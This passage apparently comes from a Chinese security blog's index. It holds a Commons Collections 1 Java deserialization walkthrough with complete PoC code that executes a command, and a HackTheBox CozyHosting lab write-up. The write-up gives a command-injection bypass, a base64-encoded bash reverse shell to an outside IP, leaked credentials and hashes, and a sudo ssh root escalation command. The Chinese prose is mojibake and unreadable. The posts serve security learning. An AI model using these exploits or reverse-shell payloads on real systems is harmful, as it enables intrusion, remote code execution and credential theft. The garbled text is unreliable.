stream&quot;); } Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); } } }} å…ˆçœ‹ç¬¬ä¸€ä¸ªifåˆ¤æ–­;å¦‚æœmemberTypeä¸ä¸ºç©ºå°±ä¼šæ¥ç€æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼› 12345678910111213Annotationæ˜¯ä¸€ä¸ªæ³¨è§£ç±»ï¼Œä¸‹é¢ä¸‰æ­¥å°±æ˜¯åœ¨å¾—åˆ°typeçš„æˆå‘˜ç±»å‹ï¼Œè€Œthis.type = type;å°±æ˜¯AnnotationInvocationHandleræ„é€ æ–¹æ³•ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ˜¯æˆ‘ä»¬å¯æ§çš„this.type = type;annotationType = AnnotationType.getInstance(type); å¾—åˆ°å®ä¾‹Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); ç”¨äºè·å–æ³¨è§£ç±»å‹ä¸­çš„æ‰€æœ‰æˆå‘˜ç±»å‹ï¼ˆåŒ…æ‹¬æˆå‘˜å˜é‡ã€æˆå‘˜æ–¹æ³•ç­‰ï¼‰String name = memberValue.getKey(); å¾—åˆ°KeyClass&lt;?&gt; memberType = memberTypes.get(name); ç„¶åä»æ³¨è§£ç±»å‹ä¸­çš„æ‰€æœ‰æˆå‘˜ç±»å‹å¾—åˆ°ä¸Šä¸€æ­¥å¾—åˆ°çš„Keyï¼Œå¦‚æœKeyä¸å­˜åœ¨è¿”å›ç©ºç›®çš„å°±æ˜¯è¦è®©memberTypeä¸ä¸ºç©ºï¼›æ‰€ä»¥æˆ‘ä»¬è¦è®©ä¼ é€’çš„Keyå†æŸä¸€ä¸ªæ³¨è§£é‡Œæœ‰å¯¹åº”çš„æˆå‘˜ç±»å‹è€Œ@Retentionå’Œ@Targetæ³¨è§£ä¸­å­˜åœ¨valueæˆå‘˜ï¼Œä½¿å¾—ä¼ é€’çš„Keyä¸ºvalueå°±è¡Œ // RetentionPolicy value() // ElementType[] value(); ç¬¬äºŒä¸ªifåˆ¤æ–­ 123memberType.isInstance(value)å¦‚æœvalueæ˜¯memberTypeæ‰€è¡¨ç¤ºçš„æˆå‘˜ç±»å‹çš„ä¸€ä¸ªå®ä¾‹ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å›trueï¼›å¦åˆ™è¿”å›falseã€‚å¦‚æœæˆ‘ä»¬è¦ä¼ é€’çš„valueä¸æ˜¯memberTypeæ‰€è¡¨ç¤ºçš„æˆå‘˜ç±»å‹çš„ä¸€ä¸ªå®ä¾‹ï¼›æ‰€ä»¥memberType.isInstance()ä¼šè¿”å›false,å†åŠ ä¸Šå‰é¢çš„!; æœ€ç»ˆç»“æœä¸ºçœŸï¼› ConstantTransformeræœ€åè§£å†³memberValue.setValueä¸­çš„å€¼æ— æ³•æ§åˆ¶ è¿™é‡Œéœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªç±»ConstantTransformerï¼›è¿™ä¸ªç±»éå¸¸æœ‰æ„æ€ï¼Œæ„é€ æ–¹æ³•ä¼ é€’ä»€ä¹ˆå€¼ï¼Œtransformå°±è¿”å›ä»€ä¹ˆå€¼ 12345678public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn;}public Object transform(Object input) { return iConstant;} æ”¹æˆä¸‹é¢è¿™ç§å½¢å¼ 123456789Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(&quot;deadbeef&quot;); åŠ¨æ€è°ƒè¯•çœ‹åˆ°ï¼Œnew ConstantTransformer(Runtime.class)å°†iConstantèµ‹å€¼ä¸ºäº†Runtime.class;æ¥ä¸‹æ¥è°ƒç”¨ConstantTransformer.transformæ–¹æ³•ï¼Œä¸ç®¡ä¼ è¿‡æ¥çš„â€inputâ€æ˜¯ä»€ä¹ˆå€¼ï¼Œå§‹ç»ˆè¿”å›Runtime.class Gadget chain:12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue TransformedMap.decorate TransformedMap.checkSetValue ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Test3 { public static void main(String[] args) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o = annotationInvocationHandler.newInstance(Target.class,transformedMap); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} LazyMapä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼ï¼Ÿä»£ç†ï¼ˆProxyï¼‰æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚ ä»£ç†æ¨¡å¼çš„ç»„æˆ æŠ½è±¡è§’è‰²ï¼šé€šè¿‡æ¥å£æˆ–æŠ½è±¡ç±»å£°æ˜çœŸå®è§’è‰²å®ç°çš„ä¸šåŠ¡æ–¹æ³•ã€‚ ä»£ç†è§’è‰²ï¼šå®ç°æŠ½è±¡è§’è‰²ï¼Œæ˜¯çœŸå®è§’è‰²çš„ä»£ç†ï¼Œé€šè¿‡çœŸå®è§’è‰²çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•æ¥å®ç°æŠ½è±¡æ–¹æ³•ï¼Œå¹¶å¯ä»¥é™„åŠ è‡ªå·±çš„æ“ä½œã€‚ çœŸå®è§’è‰²ï¼šå®ç°æŠ½è±¡è§’è‰²ï¼Œå®šä¹‰çœŸå®è§’è‰²æ‰€è¦å®ç°çš„ä¸šåŠ¡é€»è¾‘ï¼Œä¾›ä»£ç†è§’è‰²è°ƒç”¨ã€‚ ä»£ç†æ¨¡å¼çš„å…³é”®ç‚¹æ˜¯:ä»£ç†å¯¹è±¡ä¸ç›®æ ‡å¯¹è±¡.ä»£ç†å¯¹è±¡æ˜¯å¯¹ç›®æ ‡å¯¹è±¡çš„æ‰©å±•,å¹¶ä¼šè°ƒç”¨ç›®æ ‡å¯¹è±¡ã€‚ é™æ€ä»£ç†ï¼šä»£ç†ä¸€ä¸ªUserç±»çš„showæ–¹æ³• å…ˆåˆ›å»ºä¸€ä¸ªæ¥å£ä½œä¸ºæŠ½è±¡è§’è‰²ï¼› 123public interface IUser { public abstract void show();} åˆ›å»ºä¸€ä¸ªéœ€è¦è¢«ä»£ç†çš„ç±» User, 1234567public class User implements IUser { public void show(){ System.out.println(&quot;show&quot;); }} å†åˆ›å»ºä¸€ä¸ªä»£ç†ç±» 123456789101112131415public class UserProxy implements IUser{ IUser user; public UserProxy() { } public UserProxy(IUser user) { this.user = user; } @Override public void show() { user.show(); System.out.println(&quot;è°ƒç”¨äº†showæ–¹æ³•&quot;); }} å†åˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±» 1234567891011public class ProxyTest { public static void main(String[] args) { IUser user = new User(); IUser userLog = new UserProxy(user); userLog.show(); }}//show//è°ƒç”¨äº†showæ–¹æ³• æ€»ç»“ï¼š é™æ€ä»£ç†åœ¨ä½¿ç”¨æ—¶ï¼Œéœ€è¦å®šä¹‰æ¥å£æˆ–è€…çˆ¶ç±»ï¼Œè¢«ä»£ç†å¯¹è±¡ä¸ä»£ç†å¯¹è±¡ä¸€èµ·å®ç°æ¥å£æˆ–ç»§æ‰¿ç›¸åŒ çš„çˆ¶ç±» ç¼ºç‚¹ï¼š å› ä¸ºä»£ç†å¯¹è±¡éœ€è¦å’Œè¢«ä»£ç†å¯¹è±¡å®ç°ç›¸åŒçš„æ¥å£æˆ–çˆ¶ç±»ï¼Œæ‰€ä»¥ä¼šæœ‰å¤ªå¤šçš„ä»£ç†ç±» ä¸€æ—¦æ¥å£ä¸­å¢åŠ äº†æ–¹æ³•åï¼Œè¢«ä»£ç†å¯¹è±¡å’Œä»£ç†å¯¹è±¡éƒ½éœ€è¦ç»´æŠ¤ï¼ˆéå¸¸éº»çƒ¦ï¼Œä¸æ–¹ä¾¿ï¼‰ æ¯”å¦‚æˆ‘å¦‚æœä»£ç†çš„æ–¹æ³•è¿˜æœ‰updateå’Œdowload éœ€è¦åœ¨æ¥å£ï¼Œè¢«ä»£ç†çš„ç±»ï¼Œå’Œä»£ç†ç±»éƒ½éœ€è¦å†™updateå’Œdowloadæ–¹æ³•ï¼Œè¿™å°±éå¸¸ç¹çï¼› åŠ¨æ€ä»£ç†ï¼šä»£ç†ä¸€ä¸ªUserç±»çš„showæ–¹æ³• éœ€è¦ä»£ç†çš„ç±»å’Œæ¥å£éƒ½å’ŒåŠ¨æ€ä»£ç†å±•ç¤ºçš„ä¸€æ · å°†é™æ€ä»£ç†ç±»æ”¹æˆåŠ¨æ€ä»£ç†ç±» 12345678910111213141516import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserProxy002 implements InvocationHandler { private IUser target; public UserProxy002(IUser target) { this.target = target; } public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;å¼€å§‹æ‰“å°&quot;); Object returnValue = method.invoke(target, args); System.out.println(&quot;ç»“æŸæ‰“å°&quot;); return returnValue; }} æµ‹è¯•ç±» 123456789101112public class ProxyTest { public static void main(String[] args) { IUser user = new User(); InvocationHandler userProxy002 = new UserProxy002(user); IUser o = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userProxy002); o.show(); }}//å¼€å§‹æ‰“å°//show//ç»“æŸæ‰“å° å½“è°ƒç”¨o.show()æ—¶ï¼Œå°±ä¼šå»è°ƒç”¨UserProxy002ç±»ä¸­çš„invokeæ–¹æ³•,æ‡‚äº†è¿™ä¸€ç‚¹çš„è¯ï¼Œçœ‹ç¬¬äºŒæ¡é“¾ä¼šç®€å•è®¸å¤šï¼› LazyMapç¬¬äºŒæ¡é“¾çš„å…¥å£å’Œåé¢ä¸€éƒ¨åˆ†éƒ½ç±»ä¼¼ï¼Œ æˆ‘ä»¬ä¸ç”¨TransformedMapï¼Œæ”¹ç”¨LazyMap; LazyMapä¸­çš„getæ–¹æ³•è°ƒç”¨äº†factory.transform(key); 123456789public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key);} invokeè€Œåœ¨AnnotationInvocationHandlerä¸­çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†get,å¹¶ä¸”memberValuesæ˜¯å¯æ§çš„; 12345678910111213141516171819202122232425public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) { case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); ... } æˆ‘ä»¬ä»éœ€è¦ç»•è¿‡ä¸¤ifï¼› ç¬¬ä¸€ä¸ªif,è°ƒç”¨çš„æ–¹æ³•ä¸èƒ½æ˜¯equals;ç¬¬äºŒä¸ªifï¼Œåªèƒ½ä»£ç†æ— å‚æ–¹æ³•ï¼Œå¦åˆ™æŠ¥å¼‚å¸¸ï¼› Gadget chain:12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Test { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o1 = annotationInvocationHandler.newInstance(Target.class, lazyMap); Map o2 =(Map) Proxy.newProxyInstance(annotationInvocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, (InvocationHandler) o1); Object o = annotationInvocationHandler.newInstance(Target.class,o2); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} æ³¨æ„ï¼šo2.entrySet() ==&gt; o1.invoke ==&gt; lazyMap.get =&gt; â€¦","link":"/2024/02/28/CommonsCollections1/"},{"title":"CozyHosting(HTB)","text":"ä¿¡æ¯æœé›†nmap123456sudo nmap -p- -sT --min-rate 3000 10.10.11.230PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234567891011121314151617181920dirsearch -u http://cozyhosting.htb/ [19:30:12] 200 - 0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js [19:30:18] 200 - 634B - /actuator [19:30:18] 200 - 5KB - /actuator/env [19:30:19] 200 - 48B - /actuator/sessions [19:30:19] 200 - 10KB - /actuator/mappings [19:30:19] 200 - 15B - /actuator/health [19:30:19] 200 - 124KB - /actuator/beans [19:30:19] 401 - 97B - /admin [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload.swf [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload_f9.swf [19:30:36] 500 - 73B - /error [19:30:37] 200 - 0B - /examples/jsp/%252e%252e/%252e%252e/manager/html/ [19:30:37] 200 - 0B - /extjs/resources//charts.swf [19:30:39] 200 - 0B - /html/js/misc/swfupload//swfupload.swf [19:30:41] 200 - 12KB - /index [19:30:43] 200 - 4KB - /login [19:30:43] 200 - 0B - /login.wdm%2e [19:30:43] 204 - 0B - /logout å¯»æ‰¾æ¼æ´åœ¨dirseachä¸­çš„/actuator/sessions å‘ç°æ³„éœ²äº†ç”¨æˆ·åå’Œå…¶session 198CE8721F7394050CE8CC45241821BAD &quot;kanderson&quot; è®¿é—®adminï¼Œç”¨æ³„éœ²çš„sessionå°è¯•ç™»é™†ï¼Œå¯ä»¥æˆåŠŸç™»é™† 123456789GET /admin HTTP/1.1Host: cozyhosting.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeCookie: JSESSIONID=98CE8721F7394050CE8CC45241821BADUpgrade-Insecure-Requests: 1 å…¶ä¸­å­˜åœ¨ä¸€å¤„è¿æ¥sshçš„åŠŸèƒ½ï¼Œè¿™é‡Œå­˜åœ¨rceæ¼æ´ åˆ©ç”¨æ¼æ´ç»è¿‡æµ‹è¯•å‘ç°å¯¹hostå’Œusernameå‡åšäº†è¿‡æ»¤å¤„ç†ï¼Œä½†æ˜¯åœ¨usernameå¤„åªæ˜¯ä¸èƒ½åŒ…å«ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨%0aå’Œ%09ç­‰URLç¼–ç ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚ï¼›usernameè¿™é‡Œå­˜åœ¨rceï¼Œä½†æ˜¯ä¸ä¼šæœ‰å›æ˜¾ï¼›ä½†æ˜¯å¯ä»¥ç»™è¿™æ¡å‘½ä»¤åŠ ä¸Šåå¼•å·å¯¼è‡´å›æ˜¾(ä¼šå°†uid=1001(app)å½“ä½œå‘½ä»¤æ‰§è¡Œ)ï¼Œè¿™æœ‰ç‚¹åƒæŠ¥é”™å›æ˜¾çš„æ„Ÿè§‰ HTTP å¤´ä¸­çš„ Location å­—æ®µç”¨äºæŒ‡ç¤ºå®¢æˆ·ç«¯åº”è¯¥é‡å®šå‘åˆ°çš„ URLã€‚å½“æœåŠ¡å™¨è¿”å›å¸¦æœ‰ Location å¤´çš„å“åº”æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°æŒ‡å®šçš„ URLã€‚è¿™é€šå¸¸ç”¨äºå®ç°é¡µé¢é‡å®šå‘æˆ–è€…åœ¨éœ€è¦æ—¶å°†å®¢æˆ·ç«¯å¼•å¯¼åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚Location å¤´é€šå¸¸ä¸çŠ¶æ€ç  3xxï¼ˆé‡å®šå‘ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿å‘ŠçŸ¥å®¢æˆ·ç«¯åº”è¯¥é‡‡å–é‡å®šå‘æ“ä½œã€‚ äºæ˜¯æ„é€ payloadåå¼¹shellã€‚(è¿™åå°è¿˜å¿…é¡»åŠ ä¸€ä¸ªåˆ†å·æ‰èƒ½åå¼¹æˆåŠŸ) 123bash -i&gt;&amp; /dev/tcp/10.10.16.45/5555 0&gt;&amp;1{echo,YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo=}|{base64,-d}|bash;%7Becho%2CYmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash; user-app12app@cozyhosting:/app$ lscloudhosting-0.0.1.jar å°†cloudhosting-0.0.1.jaræ–‡ä»¶ä¸‹è½½ä¸‹æ¥ 123456æ–¹æ³•ä¸€nc -nv 10.10.16.45 8888 &lt; cloudhosting-0.0.1.jarnc -lvvp 8888 &gt; cloudhosting-0.0.1.jaræ–¹æ³•äºŒpython3 -m http.server å°†æ–‡ä»¶ç”¨jd-guiåæ±‡ç¼–ï¼Œå¯ä»¥å‘ç°ä¸€å¯¹è´¦å·å¯†ç  cat /etc/passwdä¸­ç¡®å®å­˜åœ¨postgresç”¨æˆ·;å°è¯•sshç™»é™†ä¸€ç›´å¤±è´¥ï¼Œå°è¯•ç™»é™†æ•°æ®åº“ 123app:x:1001:1001::/home/app:/bin/shpostgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashjosh:x:1003:1003::/home/josh:/usr/bin/bash psqlnetstat -pantu | grep &quot;5432&quot; netstat -pantu æ˜¯ä¸€ä¸ªç”¨äºæ˜¾ç¤ºç³»ç»Ÿç½‘ç»œçŠ¶æ€çš„å‘½ä»¤ã€‚åœ¨è¿™ä¸ªå‘½ä»¤ä¸­ï¼š -p é€‰é¡¹ç”¨äºæ˜¾ç¤ºä¸è¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹ ID å’Œè¿›ç¨‹åç§°ã€‚ -a é€‰é¡¹ç”¨äºæ˜¾ç¤ºæ‰€æœ‰çš„è¿æ¥å’Œç›‘å¬ç«¯å£ã€‚ -n é€‰é¡¹ç”¨äºæ˜¾ç¤ºæ•°å­—å½¢å¼çš„ IP åœ°å€å’Œç«¯å£å·ï¼Œè€Œä¸è¿›è¡ŒåŸŸåè§£æã€‚ -t é€‰é¡¹ç”¨äºæ˜¾ç¤º TCP è¿æ¥çš„ä¿¡æ¯ã€‚ -u é€‰é¡¹ç”¨äºæ˜¾ç¤º UDP è¿æ¥çš„ä¿¡æ¯ã€‚ å› æ­¤ï¼Œnetstat -pantu å‘½ä»¤ä¼šæ˜¾ç¤ºç³»ç»Ÿä¸Šæ‰€æœ‰çš„ TCP å’Œ UDP è¿æ¥ï¼Œä»¥åŠä¸è¿™äº›è¿æ¥ç›¸å…³çš„è¿›ç¨‹ä¿¡æ¯ã€‚ ç«¯å£ 5432 é€šå¸¸ç”¨äº PostgreSQL æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚è¿™ä¸ªç«¯å£æ˜¯PostgreSQLé»˜è®¤çš„æ•°æ®åº“è®¿é—®ç«¯å£ï¼Œç”¨äºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºè¿æ¥åˆ° PostgreSQL æœåŠ¡å™¨ã€‚ PostgreSQL æ˜¯ä¸€ä¸ªæµè¡Œçš„å¼€æºå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œå¸¸ç”¨äºå„ç§ç±»å‹çš„åº”ç”¨ç¨‹åºå’Œç½‘ç«™ã€‚ ç™»é™†æ•°æ®åº“ 123python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;psql -U postgres -h localhostPassword for user postgres: Vg&amp;nvzAQ7XxR ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ psql å‘½ä»¤ï¼š è¿æ¥åˆ°æ•°æ®åº“ï¼š 1psql -U username -d dbname -h hostname åˆ—å‡ºæ•°æ®åº“ï¼š 1\\l è¿æ¥åˆ°æ•°æ®åº“ï¼š 1\\c dbname åˆ—å‡ºè¡¨ï¼š 1\\dt æ˜¾ç¤ºè¡¨ç»“æ„ï¼š 1\\d table_name é€€å‡º psqlï¼š 1\\q åœ¨æœ¬é¢˜ä¸­æ•æ„Ÿä¿¡æ¯å­˜æ”¾åœ¨cozyhostingåº“ä¸­çš„usersè¡¨ä¸­ 123456789cozyhosting=# select * from users;select * from users; name | password | role -----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi çˆ†ç ´adminçš„å¯†ç å±…ç„¶æ˜¯ç”¨æˆ·joshçš„å¯†ç ï¼Œè¿™å°±æœ‰ç‚¹ç¦»è°±äº†ï¼›è¿™é‡Œç›´æ¥ç”¨sshå¯ä»¥è¿æ¥ usr-josh12ssh josh@10.10.11.230manchesterunited #è¾“å…¥å¯†ç  sudo -l 1234567josh@cozyhosting:~$ sudo -l[sudo] password for josh: Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser josh may run the following commands on localhost: (root) /usr/bin/ssh * (root) /usr/bin/ssh *è¡¨ç¤ºä»¥rootèº«ä»½è¿è¡Œsshï¼Œ*è¡¨ç¤ºå¯ä»¥ä½¿ç”¨ä»»ä½•å‚æ•° ç›´æ¥åœ¨è¿™ä¸ªç½‘ç«™å¯»æ‰¾sshsudoææƒï¼›clink me æœ€ç»ˆä½¿ç”¨ææƒå‘½ä»¤å¦‚ä¸‹ 1sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x è¡¥å……è¿™æ˜¯ä»cloudhosting-0.0.1.jarçš„ä¸€æ®µä»£ç ï¼›è¿™åº”è¯¥å°±æ˜¯å®ç°sshåŠŸèƒ½,è¿‡æ»¤ä¸å½“äº§ç”Ÿrceæ¼æ´çš„åœ°æ–¹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package BOOT-INF.classes.htb.cloudhosting.compliance;import jakarta.servlet.http.HttpServletResponse;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.util.regex.Pattern;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class ComplianceService { private final Pattern HOST_PATTERN = Pattern.compile(&quot;^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\\\.?$&quot;); @RequestMapping(method = {RequestMethod.POST}, path = {&quot;/executessh&quot;}) public void executeOverSsh(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;host&quot;) String host, HttpServletResponse response) throws IOException { StringBuilder rbuilder = new StringBuilder(&quot;/admin?error=&quot;); try { validateHost(host); validateUserName(username); Process process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, String.format(&quot;ssh -o ConnectTimeout=1 %s@%s&quot;, new Object[] { username, host }) }); (new BufferedReader(new InputStreamReader(process.getErrorStream()))).lines() .forEach(line -&gt; { if (!line.startsWith(&quot;Pseudo-terminal&quot;)) rbuilder.append(line); }); } catch (IllegalArgumentException exception) { rbuilder.append(exception.getMessage()); } catch (Exception exception) { rbuilder.append(&quot;ssh: Cannot connect to the host&quot;); } finally { response.sendRedirect(rbuilder.toString()); } } private void validateUserName(String username) { if (username.contains(&quot; &quot;)) throw new IllegalArgumentException(&quot;Username can't contain whitespaces!&quot;); } private void validateHost(String host) { if (!this.HOST_PATTERN.matcher(host).matches()) throw new IllegalArgumentException(&quot;Invalid hostname!&quot;); }} æ€»ç»“nampæœé›†å¼€æ”¾80ç«¯å£ï¼›dirsearchæœé›†åˆ°/adminè·¯ç”±,/actuator/sessions è·¯ç”±ï¼›/actuator/sessions 